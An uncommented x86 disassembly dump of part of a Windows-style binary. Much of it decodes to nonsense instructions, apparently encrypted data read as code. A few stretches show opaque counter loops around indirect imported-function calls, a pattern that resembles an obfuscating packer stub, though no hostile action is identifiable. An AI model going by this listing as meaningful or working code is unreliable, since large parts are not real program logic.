  40e5f8:	add    dh,BYTE PTR [esi]
  40e5fa:	repnz push eax
  40e5fc:	add    eax,0x7755b30f
  40e601:	clc    
  40e602:	pop    edx
  40e603:	aam    0x3
  40e605:	push   ds
  40e606:	rol    BYTE PTR [esi+0x59],1
  40e609:	cmp    al,BYTE PTR [esi+0x79]
  40e60c:	push   ebx
  40e60d:	cdq    
  40e60e:	(bad)  
  40e60f:	push   eax
  40e610:	add    eax,0x39b50259
  40e615:	out    dx,eax
  40e616:	xchg   edi,eax
  40e617:	jb     0x40e649
  40e619:	ss std 
  40e61b:	and    eax,0x1a2499fa
  40e620:	sub    ebp,edx
  40e622:	pusha  
  40e623:	jl     0x40e600
  40e625:	dec    ecx
  40e626:	ins    DWORD PTR es:[edi],dx
  40e627:	or     al,0x1c
  40e629:	push   esp
  40e62b:	nop
  40e62c:	xchg   esp,eax
  40e62d:	arpl   WORD PTR [ebx],ax
  40e62f:	dec    esp
  40e630:	adc    eax,0x7ff45477
  40e635:	push   cs
  40e636:	int    0x7b
  40e638:	mov    bl,0xcd
  40e63a:	sub    DWORD PTR [edx-0x4f91d26b],edi
  40e640:	sbb    ebp,edi
  40e642:	adc    dl,al
  40e644:	in     eax,0x4d
  40e646:	xchg   esi,eax
  40e647:	push   edi
  40e648:	mov    DWORD PTR [eax+0x1030abb7],ecx
  40e64e:	pop    esi
  40e64f:	push   es
  40e650:	scas   eax,DWORD PTR es:[edi]
  40e651:	and    cl,bl
  40e653:	jmp    0xdf862bc8
  40e658:	std    
  40e659:	js     0x40e61a
  40e65b:	inc    ebx
  40e65c:	fidiv  DWORD PTR [ebx+0x40]
  40e65f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e660:	or     ah,BYTE PTR [eax-0x4bfc1f1d]
  40e666:	push   eax
  40e667:	add    ebp,DWORD PTR [esp+ecx*2-0x35f80b14]
  40e66e:	les    esi,FWORD PTR [eax+eiz*2]
  40e671:	push   ds
  40e672:	out    dx,eax
  40e673:	fwait
  40e674:	mov    dl,0x23
  40e676:	add    ch,ch
  40e678:	sbb    ebp,DWORD PTR [ecx]
  40e67a:	add    al,0x40
  40e67c:	jne    0x40e685
  40e67e:	cwde   
  40e67f:	jns    0x40e650
  40e681:	and    bh,BYTE PTR [ecx+0x5]
  40e684:	int    0x6a
  40e686:	ret    0x8ed6
  40e689:	call   0x96d6431c
  40e68e:	ret    
  40e68f:	jmp    0x106fc1a2
  40e694:	inc    ebp
  40e695:	mov    eax,0xdbef2b39
  40e69a:	jb     0x40e709
  40e69c:	add    eax,0x5140d4cc
  40e6a1:	jo     0x40e686
  40e6a3:	and    DWORD PTR [esi],0xffffffd6
  40e6a6:	int3   
  40e6a7:	or     esp,DWORD PTR [ebx]
  40e6a9:	sub    cl,cl
  40e6ab:	int    0xe1
  40e6ad:	push   eax
  40e6ae:	or     ebp,DWORD PTR [ebp+0x352ce087]
  40e6b4:	mov    bh,0x36
  40e6b6:	addr16 cmp ecx,esp
  40e6b9:	fwait
  40e6ba:	and    al,ch
  40e6bc:	es push eax
  40e6be:	repz imul edx,DWORD PTR [edx-0x2],0x53
  40e6c3:	cs jo  0x40e6bc
  40e6c6:	mov    esp,0x5634eaf6
  40e6cb:	mov    esp,0x92ee42b7
  40e6d0:	call   0xf40b:0x183db925
  40e6d7:	imul   edx,DWORD PTR [ebx],0xdfca95b5
  40e6dd:	mov    ds:0x6937a2f6,al
  40e6e2:	xchg   esi,eax
  40e6e3:	sub    ch,bh
  40e6e5:	inc    eax
  40e6e6:	out    0x35,eax
  40e6e8:	mov    edx,0x2b3f76e
  40e6ed:	or     al,0x52
  40e6ef:	xchg   ebx,eax
  40e6f0:	sahf   
  40e6f1:	stos   BYTE PTR es:[edi],al
  40e6f2:	pop    ebp
  40e6f3:	lods   eax,DWORD PTR ds:[esi]
  40e6f4:	ins    DWORD PTR es:[edi],dx
  40e6f5:	loopne 0x40e752
  40e6f7:	sti    
  40e6f8:	in     eax,dx
  40e6f9:	jae    0x40e747
  40e6fb:	ds inc ebp
  40e6fd:	sbb    BYTE PTR [ebx],dh
  40e6ff:	mov    BYTE PTR [ebx],0xc3
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	inc    esi
  40e733:	jae    0x40e790
  40e735:	loope  0x40e776
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	or     BYTE PTR [ebx],0x5b
  40e741:	xchg   esp,eax
  40e742:	mov    esi,DWORD PTR [edi]
  40e744:	jae    0x40e7b9
  40e746:	bound  ecx,QWORD PTR [ebx]
  40e748:	or     esi,ecx
  40e74a:	out    dx,al
  40e74b:	push   esp
  40e74c:	test   al,0x5a
  40e74e:	imul   eax,DWORD PTR [ebp+0x7e],0xe00ee1b4
  40e755:	in     al,dx
  40e756:	ror    BYTE PTR [ebx+eiz*8-0x50590ed2],1
  40e75d:	xchg   ebp,eax
  40e75e:	(bad)  
  40e75f:	fsubr  QWORD PTR [edx+0x27e947c4]
  40e765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e766:	push   ss
  40e767:	pushf  
  40e768:	addr16 jne 0x40e7e3
  40e76b:	pop    ecx
  40e76c:	xor    DWORD PTR [edx+ebp*4],esp
  40e76f:	jbe    0x40e702
  40e771:	test   BYTE PTR [ebx+0xe573deb],bl
  40e777:	inc    edx
  40e778:	adc    al,0x8d
  40e77a:	fcmovb st,st(2)
  40e77c:	(bad)  
  40e77d:	xchg   ebp,eax
  40e77e:	test   BYTE PTR [esi+0x5094c945],dl
  40e784:	sti    
  40e785:	ins    BYTE PTR es:[edi],dx
  40e786:	add    bl,cl
  40e788:	jmp    FWORD PTR [esi-0x5c]
  40e78b:	dec    edx
  40e78c:	arpl   si,bp
  40e78e:	push   edx
  40e78f:	test   BYTE PTR ds:0x55fbb7fb,dh
  40e795:	aad    0x78
  40e797:	mov    ds:0x6fb9af41,al
  40e79c:	test   al,0x8c
  40e79e:	mov    ds:0xf5abcc47,al
  40e7a3:	out    dx,al
  40e7a4:	mov    bl,0x75
  40e7a6:	xor    DWORD PTR [edx],0x62761648
  40e7ac:	imul   ecx,DWORD PTR [edx+ebp*8],0xc5e81233
  40e7b3:	sti    
  40e7b4:	pop    edx
  40e7b5:	pop    es
  40e7b6:	(bad)  
  40e7b8:	add    DWORD PTR [edi],eax
  40e7ba:	cmp    cl,0xda
  40e7bd:	or     bh,BYTE PTR ss:[edi+edx*2]
  40e7c1:	inc    ecx
  40e7c2:	in     eax,0x1b
  40e7c4:	mov    cl,0xaf
  40e7c6:	sub    al,0xb1
  40e7c8:	mov    bh,0x5d
  40e7ca:	add    al,0x40
  40e7cc:	js     0x40e76a
  40e7ce:	in     eax,0xbe
  40e7d0:	mov    dh,0x34
  40e7d2:	(bad)  
  40e7d4:	fsub   DWORD PTR [ecx]
  40e7d6:	inc    eax
  40e7d7:	jae    0x40e7dc
  40e7d9:	cs cmp eax,ebx
  40e7dc:	push   0xffffffc5
  40e7de:	pop    ebx
  40e7df:	cmp    al,0xc3
  40e7e1:	push   edi
  40e7e2:	sbb    cl,BYTE PTR [edx+0x39]
  40e7e5:	nop
  40e7e6:	test   eax,0x9631b186
  40e7eb:	mov    dh,dl
  40e7ed:	jp     0x40e83a
  40e7ef:	fcom   st(0)
  40e7f1:	mov    dh,0xa9
  40e7f3:	jmp    0x410153a7
  40e7f8:	fidiv  WORD PTR [edi]
  40e7fa:	dec    edi
  40e7fb:	imul   edi,DWORD PTR [ebp-0x2e],0x2
  40e7ff:	push   ebx
  40e800:	retf   
  40e801:	cmp    esi,ebx
  40e803:	cmp    al,0x94
  40e805:	je     0x40e7dc
  40e807:	inc    ebx
  40e808:	cdq    
  40e809:	(bad)  
  40e80a:	jle    0x40e81c
  40e80c:	das    
  40e80d:	mov    ebp,0x7b2e9566
  40e812:	ud0    edx,DWORD PTR [ecx+0x5c9a5e46]
  40e819:	aaa    
  40e81a:	nop
  40e81b:	ret    0xa822
  40e81e:	cmc    
  40e81f:	mov    esp,0xd70148f1
  40e824:	fld    TBYTE PTR [edi]
  40e826:	pop    ds
  40e827:	mov    esp,0x3b6982c7
  40e82c:	or     eax,0x9ea5f087
  40e831:	xchg   esp,eax
  40e832:	xchg   ecx,eax
  40e833:	add    ah,BYTE PTR [ecx-0x42]
  40e836:	into   
  40e837:	xchg   DWORD PTR [esi],eax
  40e839:	(bad)  
  40e83a:	(bad)  
  40e83b:	jmp    0x40e8af
  40e83d:	loop   0x40e87d
  40e83f:	inc    edi
  40e840:	push   edx
  40e841:	stos   BYTE PTR es:[edi],al
  40e842:	sub    DWORD PTR [edx],esi
  40e844:	jno    0x40e819
  40e846:	les    ebp,FWORD PTR [edx-0x6315154]
  40e84c:	jnp    0x40e871
  40e84e:	sub    esi,DWORD PTR [esi+0x1]
  40e851:	and    DWORD PTR [ebp-0x6cf5ce52],0xfffffff3
  40e858:	inc    edx
  40e859:	fsubr  st(3),st
  40e85b:	in     al,dx
  40e85c:	ficom  WORD PTR [ebp-0x59]
  40e85f:	daa    
  40e860:	pop    ss
  40e861:	add    eax,DWORD PTR [ebx]
  40e863:	jno    0x40e7f8
  40e865:	bound  ebx,QWORD PTR [ebx+ebp*2+0xd]
  40e869:	add    eax,0xf7c5b4fd
  40e86e:	ss rol ch,cl
  40e871:	adc    al,0x91
  40e873:	pop    esi
  40e874:	ret    
  40e875:	cmp    DWORD PTR [ebx+0x36],esp
  40e878:	and    edi,ebx
  40e87a:	jo     0x40e837
  40e87c:	ins    BYTE PTR es:[edi],dx
  40e87d:	inc    edi
  40e87e:	sub    al,0x98
  40e880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e881:	xchg   ebx,eax
  40e882:	sbb    bl,BYTE PTR [esi-0x552116b7]
  40e888:	pop    ecx
  40e889:	imul   esi,DWORD PTR [ebp-0x2eb0ba11],0x52a68cae
  40e893:	pop    ecx
  40e894:	fld    DWORD PTR [edx-0x426631a9]
  40e89a:	push   edx
  40e89b:	xlat   BYTE PTR ds:[ebx]
  40e89c:	out    0x10,eax
  40e89e:	rdtsc  
  40e8a0:	fwait
  40e8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8a2:	mov    edi,0x61c360a0
  40e8a7:	in     al,0xd7
  40e8a9:	pop    ss
  40e8aa:	mov    cl,0x8c
  40e8ac:	dec    edx
  40e8ad:	call   0x3500:0x8ae4b7de
  40e8b4:	mov    ebx,0xe21da54b
  40e8b9:	inc    esi
  40e8ba:	cmc    
  40e8bb:	xlat   BYTE PTR ds:[ebx]
  40e8bc:	xor    eax,0xd03969cc
  40e8c1:	jg     0x40e92e
  40e8c3:	cmp    al,al
  40e8c5:	push   esi
  40e8c6:	push   ds
  40e8c7:	xchg   dh,ch
  40e8c9:	mov    WORD PTR [edi+0x20],cs
  40e8cc:	mov    ebx,0xe36c9342
  40e8d1:	ror    esi,cl
  40e8d3:	push   cs
  40e8d4:	mov    al,ds:0x2f9c5fad
  40e8d9:	jmp    0xc2650cb6
  40e8de:	repz sub edx,ecx
  40e8e1:	pusha  
  40e8e2:	dec    esi
  40e8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8e4:	sbb    al,0xd5
  40e8e6:	or     esi,eax
  40e8e8:	aam    0xaf
  40e8ea:	add    ah,BYTE PTR [esi+0xb]
  40e8ed:	stc    
  40e8ee:	pop    esp
  40e8ef:	cwde   
  40e8f0:	jmp    0x40e95d
  40e8f2:	ins    DWORD PTR es:[edi],dx
  40e8f3:	jae    0x40e8b0
  40e8f5:	test   al,0xf8
  40e8f7:	cmp    al,0x7d
  40e8f9:	xchg   esp,eax
  40e8fa:	pop    ecx
  40e8fb:	cmc    
  40e8fc:	shl    cl,cl
  40e8fe:	js     0x40e949
  40e900:	std    
  40e901:	adc    bl,BYTE PTR [ebp-0x6f]
  40e904:	xlat   BYTE PTR ds:[ebx]
  40e905:	pop    ebp
  40e906:	inc    ecx
  40e907:	adc    BYTE PTR [esi-0x4],0x4d
  40e90b:	sbb    BYTE PTR [eax+0x52],ch
  40e90e:	arpl   WORD PTR [edx+edx*2+0x27a8015],bx
  40e915:	sbb    eax,0xf1d3d187
  40e91a:	(bad)  
  40e91b:	fs push ecx
  40e91d:	jne    0x40e8cc
  40e91f:	icebp  
  40e920:	pop    edi
  40e921:	fdivrp st(2),st
  40e923:	mov    ah,0x33
  40e925:	sbb    BYTE PTR [esi+0x33b6fc13],0xb2
  40e92c:	xchg   edx,eax
  40e92d:	xchg   ecx,eax
  40e92e:	adc    DWORD PTR [eax+edx*8+0x3e],0x8e7ea393
  40e936:	dec    eax
  40e937:	mov    ebx,0x6af7d476
  40e93c:	mov    al,al
  40e93e:	daa    
  40e93f:	lds    ebp,FWORD PTR [ecx+0x73]
  40e942:	push   eax
  40e943:	push   ss
  40e944:	repnz cmp DWORD PTR [edx],esp
  40e947:	jmp    0xee6b3cce
  40e94c:	(bad)  
  40e94d:	bound  esp,QWORD PTR [edx]
  40e94f:	mov    eax,0x8f760651
  40e954:	inc    ebp
  40e955:	sub    ebp,ebp
  40e957:	push   ebx
  40e958:	pop    ss
  40e959:	inc    edi
  40e95a:	sub    BYTE PTR [edx+0x71],bl
  40e95d:	mov    eax,0xec832226
  40e962:	jnp    0x40e967
  40e964:	(bad)  
  40e965:	jecxz  0x40e982
  40e967:	cmp    DWORD PTR [esp+edi*1-0x27],edx
  40e96b:	adc    edx,DWORD PTR [esi-0x26]
  40e96e:	scas   eax,DWORD PTR es:[edi]
  40e96f:	add    al,0x68
  40e971:	das    
  40e972:	(bad)  
  40e973:	push   edx
  40e974:	push   0xffffff95
  40e976:	mov    bl,0xb5
  40e978:	lock mov eax,DWORD PTR [ebp+0xc]
  40e97c:	xor    eax,esi
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a811,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a811
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a811,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a811,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a811,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a811
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a811,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a811,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	dec    esp
  40ea23:	mov    al,0x62
  40ea25:	xchg   ah,dh
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	stc    
  40ea2f:	aam    0xac
  40ea31:	and    al,0xe8
  40ea34:	ds dec esp
  40ea36:	or     ebp,DWORD PTR [eax-0x64]
  40ea39:	add    eax,0xfadac767
  40ea3e:	std    
  40ea3f:	jl     0x40ea1a
  40ea41:	push   esi
  40ea42:	fadd   st,st(3)
  40ea44:	lods   al,BYTE PTR ds:[esi]
  40ea45:	adc    DWORD PTR [edx+0x41],ebx
  40ea48:	and    ecx,DWORD PTR [ecx]
  40ea4a:	outs   dx,DWORD PTR ds:[esi]
  40ea4b:	jo     0x40ea30
  40ea4d:	sub    dh,BYTE PTR [ebx+0x58]
  40ea50:	rol    DWORD PTR [ecx-0x2b],0x74
  40ea54:	aam    0xd9
  40ea56:	lea    ebp,[eax-0x553bef82]
  40ea5c:	inc    esi
  40ea5d:	cld    
  40ea5e:	and    esp,ebp
  40ea60:	lock xchg ebp,eax
  40ea62:	pushf  
  40ea63:	add    DWORD PTR [ebx+0x469f973a],0xffffff89
  40ea6a:	cmp    al,0xde
  40ea6c:	add    ebx,esp
  40ea6e:	fadd   DWORD PTR [ebp-0x26a9de59]
  40ea74:	mov    dl,BYTE PTR [edx-0x1623f217]
  40ea7a:	inc    eax
  40ea7b:	retf   
  40ea7c:	mov    DWORD PTR [ecx+0x5e37284c],0x88841832
  40ea86:	aam    0xaa
  40ea88:	push   0xfaee344b
  40ea8d:	in     eax,0xb
  40ea8f:	pop    ss
  40ea90:	mov    dh,0x5
  40ea92:	cmp    BYTE PTR [ebp+0x1a0d55c],ah
  40ea98:	in     al,dx
  40ea99:	pop    ebp
  40ea9a:	(bad)  
  40ea9b:	cmp    eax,edx
  40ea9d:	loopne 0x40ea21
  40ea9f:	call   0x4eda:0x9124db99
  40eaa6:	lods   al,BYTE PTR ds:[esi]
  40eaa7:	xchg   DWORD PTR [ebx-0x31],ecx
  40eaaa:	cmp    edi,DWORD PTR [edi-0x66]
  40eaad:	lea    edx,[eax+esi*1+0x2a2bde44]
  40eab4:	(bad)  
  40eab5:	(bad)  
  40eab6:	pop    esi
  40eab7:	cwde   
  40eab8:	add    eax,0xd1b60ec3
  40eabd:	dec    edx
  40eabe:	jp     0x40eabd
  40eac0:	mov    ah,0x4e
  40eac2:	ret    
  40eac3:	cmp    eax,0x94ca9038
  40eac8:	sbb    dh,ch
  40eaca:	push   es
  40eacb:	mov    ebx,ebp
  40eacd:	pop    ss
  40eace:	cmp    al,0xf5
  40ead0:	lahf   
  40ead1:	aad    0xcb
  40ead3:	push   edx
  40ead4:	in     al,dx
  40ead5:	cmp    esp,esp
  40ead7:	stos   BYTE PTR es:[edi],al
  40ead8:	in     eax,0xcd
  40eada:	fucomp st(5)
  40eadc:	aaa    
  40eadd:	mov    ebp,0x85dcb338
  40eae2:	dec    ecx
  40eae3:	fiadd  WORD PTR [ebx+eax*8-0x78]
  40eae7:	fisttp WORD PTR [esi+0x53]
  40eaea:	mov    ebx,gs
  40eaec:	mov    ch,0x50
  40eaee:	ja     0x40ea79
  40eaf0:	ins    DWORD PTR es:[edi],dx
  40eaf1:	sbb    BYTE PTR [ebx],0xc5
  40eaf4:	fist   DWORD PTR [edx+edx*8+0x61]
  40eaf8:	jg     0x40eab9
  40eafa:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eafc:	out    0x13,al
  40eafe:	fcom   QWORD PTR [eax-0x1]
  40eb01:	xor    al,0x0
  40eb03:	das    
  40eb04:	xchg   ecx,eax
  40eb05:	inc    ebp
  40eb06:	sar    DWORD PTR [edi+edi*2],cl
  40eb09:	dec    edx
  40eb0a:	pop    ecx
  40eb0b:	xor    dh,dh
  40eb0d:	pop    esi
  40eb0e:	dec    esi
  40eb0f:	sub    esi,edx
  40eb11:	sub    eax,0x1c434566
  40eb16:	cmp    DWORD PTR [eax],edi
  40eb18:	dec    edi
  40eb19:	gs mov al,0x10
  40eb1c:	jbe    0x40eb57
  40eb1e:	sahf   
  40eb1f:	push   ebp
  40eb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb21:	ins    DWORD PTR es:[edi],dx
  40eb22:	and    al,0x95
  40eb24:	fiadd  DWORD PTR [eax]
  40eb26:	loop   0x40eb65
  40eb28:	xor    BYTE PTR ds:0xbdb687d6,bl
  40eb2e:	add    ecx,DWORD PTR [ebp-0x1b]
  40eb31:	popf   
  40eb32:	jmp    0x2ae6:0xffa182e0
  40eb39:	mov    ebp,0x3388225d
  40eb3e:	mov    edi,0x3db68fe0
  40eb43:	into   
  40eb44:	pop    edi
  40eb45:	push   edx
  40eb46:	sbb    al,0x55
  40eb48:	inc    esi
  40eb49:	(bad)  
  40eb4a:	out    dx,al
  40eb4b:	sub    BYTE PTR [ebx-0x4168125e],dl
  40eb51:	adc    eax,0xa0e1617d
  40eb56:	mov    DWORD PTR ds:0x9ee7d773,eax
  40eb5c:	push   edi
  40eb5d:	pop    ds
  40eb5e:	aas    
  40eb5f:	lods   eax,DWORD PTR ds:[esi]
  40eb60:	(bad)  
  40eb61:	sub    eax,0xb0c9f485
  40eb66:	xor    edx,esi
  40eb68:	aas    
  40eb69:	adc    esi,edx
  40eb6b:	sbb    edx,esp
  40eb6d:	dec    ebx
  40eb6e:	popf   
  40eb6f:	push   edx
  40eb70:	push   ebx
  40eb71:	sahf   
  40eb72:	jo     0x40eb39
  40eb74:	push   0xfffffff9
  40eb76:	add    al,0xba
  40eb78:	push   ds
  40eb79:	jle    0x40eb93
  40eb7b:	jecxz  0x40eb2f
  40eb7d:	or     eax,0x70089aeb
  40eb82:	stc    
  40eb83:	mov    al,ds:0x6b234641
  40eb88:	and    dh,BYTE PTR [esi]
  40eb8a:	adc    ah,BYTE PTR [eax-0x2d8d513d]
  40eb90:	dec    ebx
  40eb91:	cmp    DWORD PTR [ecx],edx
  40eb93:	xor    BYTE PTR [edx+0x609ea33c],dl
  40eb99:	lea    ecx,[ebx+0x3f]
  40eb9c:	adc    al,0x68
  40eb9e:	add    DWORD PTR [edx-0x4f622eec],esp
  40eba4:	sbb    DWORD PTR [edi-0xb],ebx
  40eba7:	xor    eax,0xf297a6ce
  40ebac:	lea    esi,[esi+0x7a]
  40ebaf:	jle    0x40ec1f
  40ebb1:	addr16 jl 0x40ebeb
  40ebb4:	shl    ecx,cl
  40ebb6:	and    al,0xbc
  40ebb8:	ds dec ebx
  40ebba:	xchg   DWORD PTR [esi],ebx
  40ebbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebbd:	stos   DWORD PTR es:[edi],eax
  40ebbe:	pop    edi
  40ebbf:	sub    BYTE PTR [ecx+0x4a242378],dl
  40ebc5:	leave  
  40ebc6:	je     0x40eb93
  40ebc8:	cmc    
  40ebc9:	sub    al,0xb7
  40ebcb:	jecxz  0x40eb72
  40ebcd:	repz cmp eax,0x80fc59a5
  40ebd3:	mov    ch,0x3d
  40ebd5:	xor    BYTE PTR [eax+eiz*4-0x1],0xe5
  40ebda:	out    dx,eax
  40ebdb:	adc    esi,ebx
  40ebdd:	mov    ds:0xea743f0c,eax
  40ebe2:	cdq    
  40ebe3:	cmp    al,0x68
  40ebe5:	pop    esp
  40ebe6:	mov    DWORD PTR [esi],ebp
  40ebe8:	xchg   ebp,eax
  40ebe9:	jo     0x40ebee
  40ebeb:	retf   
  40ebec:	mov    eax,0xdd3ca3b9
  40ebf1:	adc    DWORD PTR [ebp-0x27932b83],ecx
  40ebf7:	mov    ds:0xdad586ec,al
  40ebfc:	pcmpgtb mm5,QWORD PTR [edi]
  40ebff:	lods   eax,DWORD PTR ds:[esi]
  40ec00:	neg    DWORD PTR [ebx]
  40ec02:	leave  
  40ec03:	jmp    0x40ec24
  40ec05:	ja     0x40ebd6
  40ec07:	mov    ah,0x3f
  40ec09:	jno    0x40eb91
  40ec0b:	(bad)  
  40ec0c:	not    BYTE PTR ds:0x3f2a1db0
  40ec12:	xchg   edx,eax
  40ec13:	enter  0x9bf3,0x8a
  40ec17:	xor    ah,dh
  40ec19:	fnsave [eax+eiz*4]
  40ec1c:	pop    ds
  40ec1d:	ins    BYTE PTR es:[edi],dx
  40ec1e:	cdq    
  40ec1f:	or     al,ah
  40ec21:	xor    DWORD PTR [esi+ecx*1-0x642632b3],edx
  40ec28:	shl    ecx,0x7c
  40ec2b:	ins    BYTE PTR es:[edi],dx
  40ec2c:	and    eax,0x2fbe4af
  40ec31:	inc    edx
  40ec32:	outs   dx,DWORD PTR ds:[esi]
  40ec33:	jmp    0x45ff02aa
  40ec38:	jbe    0x40ebce
  40ec3a:	sub    al,0xe3
  40ec3c:	xchg   ch,bh
  40ec3e:	daa    
  40ec3f:	in     al,dx
  40ec40:	mov    cl,0x23
  40ec42:	sbb    bl,0x51
  40ec45:	jle    0x40ec3a
  40ec47:	jmp    0x814b:0x1c45a7bb
  40ec4e:	(bad)  
  40ec4f:	dec    esi
  40ec50:	mov    ds:0x23777f67,eax
  40ec55:	mov    DWORD PTR [edx],0x326700fd
  40ec5b:	jo     0x40ecdc
  40ec5d:	fild   QWORD PTR ds:[edi+eax*4+0x21]
  40ec62:	pop    ecx
  40ec63:	repz lds edx,FWORD PTR [eax-0x68]
  40ec67:	jno    0x40ecb9
  40ec69:	mov    al,0xd4
  40ec6b:	jge    0x40ebfb
  40ec6d:	out    0x4a,al
  40ec6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec70:	add    esi,esi
  40ec72:	dec    ebp
  40ec73:	add    al,al
  40ec75:	and    BYTE PTR [edx+0x1f1536b2],bh
  40ec7b:	adc    al,0x24
  40ec7d:	rcr    BYTE PTR [ebp-0x85ed340],cl
  40ec83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec84:	cmp    bl,BYTE PTR [eax-0x76]
  40ec87:	xor    BYTE PTR [edi-0x7a],dh
  40ec8a:	sub    al,0xf4
  40ec8c:	push   ecx
  40ec8d:	hlt    
  40ec8e:	std    
  40ec8f:	cmp    DWORD PTR [esi-0x6b],esi
  40ec92:	into   
  40ec93:	lds    ebp,FWORD PTR [edx]
  40ec95:	xchg   esi,eax
  40ec96:	add    al,0x90
  40ec98:	ret    
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a79d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a899,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a899,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a899,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a899,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a899
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a899,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a899
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a899,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a8a5,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a8a5
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a8a5,edi
  40ed34:	cmp    DWORD PTR ds:0x42a8a5,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a8a5,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a8a5
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a8a5,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a8a5,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a81d
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a811
  40ed88:	xor    DWORD PTR ds:0x42a895,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	ficom  DWORD PTR [edi]
  40eda1:	popf   
  40eda2:	fwait
  40eda3:	popa   
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	retf   
  40edac:	xchg   esi,eax
  40edad:	jno    0x40edf7
  40edaf:	jp     0x40eda8
  40edb1:	add    ch,BYTE PTR fs:[ebx-0x50]
  40edb5:	add    eax,0xb0fd05dd
  40edba:	adc    esi,DWORD PTR [eax-0xe]
  40edbd:	(bad)  
